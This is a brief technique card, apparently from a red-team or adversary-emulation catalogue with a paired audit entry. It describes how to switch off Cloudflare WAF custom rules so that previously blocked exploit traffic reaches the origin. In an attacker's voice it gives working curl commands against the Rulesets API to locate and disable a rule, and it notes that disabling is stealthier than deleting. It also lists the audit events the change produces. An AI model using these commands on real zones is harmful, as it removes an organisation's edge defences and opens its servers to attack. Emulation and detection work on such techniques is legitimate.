---
id: cf-waf-disable
title: Cloudflare WAF/firewall rule disable (open the edge)
section: Cloudflare / edge
phase: Defense Impairment
attack:
  tactic: TA0112
  techniques: [T1686.001]
platform: [cloudflare]
source: Cloudflare defense evasion (WAF/firewall tamper)
pair: cf-waf-disable-audit
---

The WAF and firewall rules are the edge control that blocks the exploit you want to land.
Delete a custom rule or flip it to disabled and the origin is exposed to the traffic it was
dropping — no origin change needed, just an API call. Rules live in the **Rulesets engine**
under the zone's `http_request_firewall_custom` phase; the legacy Firewall Rules API
(`/firewall/rules/`) was sunset on 2025-06-15, so a modern tenant only answers on
`/rulesets/`. Disabling a single rule is quieter than deleting one — the rule stays visible
in the dashboard, just inert. Either way the change writes a Cloudflare audit event on
`resource.type=ruleset` (historical events carry `firewall_rule`) with
`action.type=update`/`delete`. (Edge control plane — no slots.)

```sh
# find the zone's custom-rules ruleset, then disable a rule so blocked traffic reaches the origin
curl -s "https://api.cloudflare.com/client/v4/zones/<zone>/rulesets/phases/http_request_firewall_custom/entrypoint" \
  -H "Authorization: Bearer <token>"
curl -s -X PATCH "https://api.cloudflare.com/client/v4/zones/<zone>/rulesets/<ruleset_id>/rules/<rule_id>" \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" --data '{"enabled":false}'
```
